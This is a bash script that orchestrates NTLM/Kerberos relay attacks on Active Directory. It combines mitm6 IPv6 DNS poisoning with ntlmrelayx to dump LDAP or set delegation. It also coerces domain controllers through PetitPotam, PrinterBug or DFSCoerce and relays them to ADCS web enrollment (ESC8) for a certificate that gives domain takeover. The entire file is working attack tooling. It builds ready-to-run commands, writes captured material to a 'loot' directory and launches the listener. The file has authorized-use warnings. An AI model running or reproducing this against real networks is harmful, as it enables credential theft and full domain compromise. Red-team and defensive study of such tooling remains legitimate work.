#!/usr/bin/env bash
#
# coerce-relay.sh - authentication coercion + NTLM/Kerberos relay orchestrator
# -----------------------------------------------------------------------------
# Sets up the listener half of a relay attack and (optionally) fires the
# coercion trigger that forces a victim to authenticate to it. Two playbooks:
#
#   MODE mitm6  : IPv6 DNS takeover (mitm6) + ntlmrelayx. Great in default AD
#                 networks - victims auto-authenticate via WPAD/DNS. Relays to
#                 LDAP/LDAPS to dump the domain or set RBCD / add a computer.
#
#   MODE coerce : Force a specific target (usually a DC) to authenticate using
#                 PetitPotam / PrinterBug / DFSCoerce (via Coercer or the
#                 krbrelayx printerbug helper), relayed by ntlmrelayx to a
#                 target of your choice - classic path is relay to ADCS web
#                 enrollment (ESC8) for a DC certificate -> domain takeover.
#
# This script wires the pieces together, prints exactly what it will run, and
# requires explicit confirmation before launching (the trigger is intrusive).
# -----------------------------------------------------------------------------
# !!! HIGH-IMPACT / INTRUSIVE !!!  Coercion + relay can disrupt services and is
# extremely loud. AUTHORIZED USE ONLY - hackathon range / lab / scoped client
# engagement. Never run on a network you are not explicitly cleared to attack.
# -----------------------------------------------------------------------------
#
# USAGE:
#   mitm6 mode:
#     sudo ./coerce-relay.sh mitm6 -d <domain> -t <relay_target> [-6 <attacker_ipv6>]
#   coerce mode:
#     sudo ./coerce-relay.sh coerce -i <victim_dc_ip> -l <listener_ip> -t <relay_target> \
#                            [-u user -p pass]   # creds help some coercion methods
#
#   <relay_target> examples:
#     ldaps://10.10.10.10                       (dump / RBCD / delegate)
#     http://10.10.10.20/certsrv/certfnsh.asp   (ESC8 - relay to ADCS)
#     smb://10.10.10.30                          (relay to another host)
#
# DEPENDENCIES (degraded gracefully):
#   ntlmrelayx (impacket)   - the relay listener (required)
#   mitm6                   - for mitm6 mode
#   Coercer / printerbug.py - for coerce mode (krbrelayx ships printerbug.py)
# -----------------------------------------------------------------------------

set -euo pipefail

c_info(){ printf '\033[1;34m[*]\033[0m %s\n' "$*"; }
c_ok(){   printf '\033[1;32m[+]\033[0m %s\n' "$*"; }
c_warn(){ printf '\033[1;33m[!]\033[0m %s\n' "$*"; }
c_err(){  printf '\033[1;31m[-]\033[0m %s\n' "$*" >&2; }
c_step(){ printf '\n\033[1;36m===== %s =====\033[0m\n' "$*"; }
have(){ command -v "$1" >/dev/null 2>&1; }
confirm(){ read -r -p "$1 [y/N] " a; [ "${a,,}" = y ]; }

MODE="${1:-}"; shift || true
[ "$MODE" = mitm6 ] || [ "$MODE" = coerce ] || { sed -n '2,46p' "$0"; exit 1; }

DOMAIN="" RELAY="" V6="" VICTIM="" LISTEN="" USER="" PASS=""
while getopts "d:t:6:i:l:u:p:h" o; do case "$o" in
  d) DOMAIN=$OPTARG;; t) RELAY=$OPTARG;; 6) V6=$OPTARG;; i) VICTIM=$OPTARG;;
  l) LISTEN=$OPTARG;; u) USER=$OPTARG;; p) PASS=$OPTARG;; *) sed -n '2,46p' "$0"; exit 1;;
esac; done

RELAYX=$(command -v ntlmrelayx.py || command -v impacket-ntlmrelayx || true)
[ -z "$RELAYX" ] && { c_err "ntlmrelayx not found (impacket)"; exit 1; }
[ "$(id -u)" -ne 0 ] && c_warn "Not root - mitm6 / raw sockets usually need sudo."

LOOT="./relay_loot_$(date +%Y%m%d_%H%M%S)"; mkdir -p "$LOOT"
c_info "Loot/output dir: $LOOT"

if [ "$MODE" = mitm6 ]; then
  [ -z "$DOMAIN" ] || [ -z "$RELAY" ] && { c_err "mitm6 mode needs -d <domain> and -t <relay_target>"; exit 1; }
  have mitm6 || { c_err "mitm6 not installed"; exit 1; }
  RELAY_CMD="$RELAYX -6 -t $RELAY -wh fakewpad.$DOMAIN -l $LOOT --no-smb-server"
  MITM_CMD="mitm6 -d $DOMAIN${V6:+ --interface-ip $V6}"
  c_step "Planned commands (mitm6 mode)"
  echo "  TERMINAL 1 (relay):   $RELAY_CMD"
  echo "  TERMINAL 2 (poison):  $MITM_CMD"
  c_warn "mitm6 will impersonate IPv6 DNS for the WHOLE local segment."
  confirm "Launch the ntlmrelayx listener now (then run mitm6 in another shell)?" || { c_info "Not launching. Commands above are ready to copy."; exit 0; }
  c_ok "Starting relay listener... (Ctrl-C to stop; loot in $LOOT)"
  exec $RELAY_CMD
fi

if [ "$MODE" = coerce ]; then
  [ -z "$VICTIM" ] || [ -z "$LISTEN" ] || [ -z "$RELAY" ] && { c_err "coerce mode needs -i <victim> -l <listener_ip> -t <relay_target>"; exit 1; }
  # pick a coercion tool
  COERCE_DESC=""; COERCE_CMD=""
  if have Coercer || have coercer; then
    CB=$(command -v Coercer || command -v coercer)
    COERCE_DESC="Coercer (tries PetitPotam/PrinterBug/DFSCoerce/etc.)"
    COERCE_CMD="$CB coerce -t $VICTIM -l $LISTEN${USER:+ -u $USER}${PASS:+ -p $PASS}${DOMAIN:+ -d $DOMAIN}"
  elif [ -f /opt/tools/krbrelayx/printerbug.py ]; then
    COERCE_DESC="printerbug.py (MS-RPRN / PrinterBug)"
    COERCE_CMD="python3 /opt/tools/krbrelayx/printerbug.py ${DOMAIN:-DOMAIN}/${USER:-user}:${PASS:-pass}@$VICTIM $LISTEN"
  else
    c_warn "No coercion tool found (Coercer / printerbug.py). Will only start the relay."
  fi
  # ESC8 (ADCS) target gets --adcs hint
  ADCS=""; case "$RELAY" in *certsrv*|*certfnsh*) ADCS="--adcs --template DomainController";; esac
  RELAY_CMD="$RELAYX -t $RELAY -smb2support $ADCS -l $LOOT"
  c_step "Planned commands (coerce mode)"
  echo "  TERMINAL 1 (relay):   $RELAY_CMD"
  [ -n "$COERCE_CMD" ] && echo "  TERMINAL 2 (trigger): $COERCE_CMD   # $COERCE_DESC"
  [ -n "$ADCS" ] && c_info "ADCS/ESC8 detected: a captured DC cert -> 'certipy auth -pfx ...' for domain takeover."
  c_warn "Coercing $VICTIM forces it to authenticate to $LISTEN. This is loud and intrusive."
  confirm "Start the ntlmrelayx listener now?" || { c_info "Not launching. Commands above are ready to copy."; exit 0; }
  c_ok "Starting relay listener... run the TERMINAL 2 trigger in another shell. (loot in $LOOT)"
  exec $RELAY_CMD
fi
